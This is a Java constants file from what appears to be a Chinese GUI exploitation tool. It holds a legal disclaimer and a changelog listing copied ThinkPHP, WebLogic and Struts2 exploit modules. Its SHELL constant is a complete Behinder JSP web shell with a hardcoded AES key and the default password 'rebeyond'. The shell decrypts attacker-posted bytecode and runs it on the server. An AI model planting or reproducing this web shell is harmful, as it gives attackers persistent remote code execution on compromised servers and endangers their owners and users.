package fun.fireline.core;

/**
 * @author yhy
 * @date 2021/3/25 11:20
 * @github https://github.com/yhy0
 */

public class Constants {

    public static String NAME = "神机";

    public static String VERSION = "v1.9 ";

    public static String AUTHOR = "yhy";

    public static String SECURITYSTATEMENT = "\t\t\t\t\t\t\t\t\t----------------------------------------------------------------\r\n\t\t\t" +
            "\t\t\t\t\t\t\t\t本工具仅提供给安全测试人员进行安全自查使用\r\n\t\t\t" +
            "\t\t\t\t\t\t\t\t用户滥用造成的一切后果与作者无关\r\n\t\t\t" +
            "\t\t\t\t\t\t\t\t使用者请务必遵守当地法律\r\n\t\t\t" +
            "\t\t\t\t\t\t\t\t本程序不得用于商业用途，仅限学习交流\r\n\t\t\t" +
            "\t\t\t\t\t\t----------------------------------------------------------------\r\n\r\n" +
            "\t\t\t\t\t\t\t\t\t\t目前所有的payload均取自网上，我只是个搬运工，感谢各位师傅\r\n\t\t\t\r\n\r\n";

    public static String UPDATEINFO =
            "Bug反馈:  https://github.com/yhy0/ExpDemo-JavaFX\r\n\r\n" +
            "V1.9\r\n" +
            "\thttp请求改用蓝鲸师傅封装好的，将蓝鲸师傅的thinkphp漏洞利用全部复制过来\r\n" +
            "\t将shack2师傅的Java反序列化漏洞利用工具V1.7中的Weblogic漏洞利用全部复制过来\r\n" +
            "\t感谢蓝鲸师傅, 原项目 https://github.com/bewhale/thinkphp_gui_tools\r\n" +
            "\t感谢shack2师傅，原项目  https://github.com/shack2/javaserializetools\r\n" +
            "V1.8\r\n" +
            "\t去除fofa搜索、去除批量检查\r\n" +
            "\t添加Struts2漏洞利用\r\n" +
            "\t增加历史记录，这样即使切换界面数据也不会丢失\r\n" +
            "V1.7\r\n" +
            "\t去除一切花里胡哨，之前的拼接怪丑死了，简单就是美\r\n" +
            "V1.6\r\n" +
            "\t使用log4j输出日志到文件\r\n" +
            "V1.5\r\n" +
            "\t界面修改，搞(抄)了个抽屉样式来切换不同的漏洞利用种类\r\n" +
            "V1.4\r\n" +
            "\t修复生成的jar文件，fofa查询时无反应（mvn生成jar时没有加载第三方包，添加MANIFEST.MF文件指定加载）\r\n" +
            "V1.3\r\n" +
            "\t增加fofa查询模块，并且fofa高级会员可以通过输入icon的url，计算hash值，查询相同icon的网站\r\n" +
            "V1.2\n" +
            "\t批量扫描模块，添加对存在漏洞的url导出功能\r\n" +
            "\t修改检测漏洞后的显示，存在、不存在、异常\r\n" +
            "V1.1\n" +
            "\t参考冰蝎的代理，添加代理设置，方便走burp调试\r\n" +
            "\t优化批量检查逻辑，使用接口，这样每次添加新的漏洞利用时，就不需要修改批量检查的逻辑";


    public static String[] ENCODING = {
            "UTF-8",
            "GBK",
            "GBK2312",
            "ISO-8859-1"
    };

//    // fofa 搜索数
//    public static int[] SIZE = {10, 50, 100, 300, 600, 1000, 10000};
//    // fofa配置保存位置
//    public static String FOFAPATH = "fofa.conf";

    // 默认为冰蝎3 的shell.jspx
    public static String SHELL = "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>";

}
